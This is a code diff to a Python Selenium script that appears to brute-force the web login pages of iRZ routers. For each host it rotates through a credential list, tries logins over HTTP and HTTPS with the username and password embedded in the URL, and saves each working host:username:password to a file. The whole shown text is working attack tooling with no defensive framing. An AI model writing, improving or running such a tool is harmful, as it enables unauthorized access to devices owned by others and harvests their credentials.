@@ -186,31 +186,22 @@ def process_host(ctx: AutomationContext, host: HostEntry) -> None:
     driver: Optional[webdriver.Remote] = None
     try:
         driver = create_driver(ctx.browser)
-        urls = [f"http://{host.address}", f"https://{host.address}"]
 
-        loaded_url = None
-        for url in urls:
-            if try_load(driver, url):
-                loaded_url = url
-                break
+        protocol_order = []
+        if try_load(driver, f"http://{host.address}"):
+            protocol_order.append("http")
+        elif try_load(driver, f"https://{host.address}"):
+            protocol_order.append("https")
 
-        if not loaded_url:
+        if not protocol_order:
             host.decrement_attempt()
             log_line(f"[{host.address}] [n/a] [Failed] (connection)")
             return
 
-        if "irz" not in driver.title.lower():
-            host.decrement_attempt()
-            log_line(f"[{host.address}] [n/a] [Failed] (missing iRZ)")
-            return
-
-        anchor = find_irz_anchor(driver)
-        if anchor:
-            try:
-                anchor.click()
-                wait_for_page(driver)
-            except WebDriverException:
-                pass
+        if protocol_order[0] == "http":
+            protocol_order.append("https")
+        else:
+            protocol_order.append("http")
 
         while True:
             with ctx.credential_lock:
@@ -221,25 +212,52 @@ def process_host(ctx: AutomationContext, host: HostEntry) -> None:
                 credential = ctx.credential_queue.popleft()
                 ctx.credential_queue.append(credential)
 
-            outcome = perform_login_flow(driver, credential)
-            if outcome == LoginOutcome.SUCCESS:
-                ctx.output_file.parent.mkdir(parents=True, exist_ok=True)
-                with ctx.output_file.open("a", encoding="utf-8") as handle:
-                    handle.write(f"{host.address}:{credential.username}:{credential.password}\n")
-                log_line(f"[{host.address}] [{credential.username}:{credential.password}] [Success]")
-                return
+            outcome = LoginOutcome.FAIL
+            last_reason = "unhandled"
 
-            if outcome == LoginOutcome.FAIL:
-                host.decrement_attempt()
-                log_line(f"[{host.address}] [{credential.username}:{credential.password}] [Failed] (unhandled)")
-                return
+            for protocol in protocol_order:
+                auth_url = f"{protocol}://{credential.username}:{credential.password}@{host.address}"
+
+                if not try_load(driver, auth_url):
+                    last_reason = f"connection via {protocol}"
+                    continue
+
+                if "irz" not in driver.title.lower():
+                    last_reason = f"missing iRZ via {protocol}"
+                    continue
+
+                anchor = find_irz_anchor(driver)
+                if anchor:
+                    try:
+                        anchor.click()
+                        wait_for_page(driver)
+                    except WebDriverException:
+                        pass
+
+                outcome = perform_login_flow(driver, credential)
+                if outcome == LoginOutcome.SUCCESS:
+                    ctx.output_file.parent.mkdir(parents=True, exist_ok=True)
+                    with ctx.output_file.open("a", encoding="utf-8") as handle:
+                        handle.write(f"{host.address}:{credential.username}:{credential.password}\n")
+                    log_line(
+                        f"[{host.address}] [{credential.username}:{credential.password}] "
+                        f"[Success] ({protocol})"
+                    )
+                    return
+
+                last_reason = "auth" if outcome == LoginOutcome.RETRY else "unhandled"
 
             host.decrement_attempt()
             if host.is_exhausted:
-                log_line(f"[{host.address}] [{credential.username}:{credential.password}] [Failed] (auth, attempts exhausted)")
+                log_line(
+                    f"[{host.address}] [{credential.username}:{credential.password}] "
+                    f"[Failed] ({last_reason}, attempts exhausted)"
+                )
                 return
 
-            log_line(f"[{host.address}] [{credential.username}:{credential.password}] [Failed] (auth)")
+            log_line(
+                f"[{host.address}] [{credential.username}:{credential.password}] [Failed] ({last_reason})"
+            )
             time.sleep(1)
     except Exception as exc:  # catch-all to keep worker thread alive
         host.decrement_attempt()
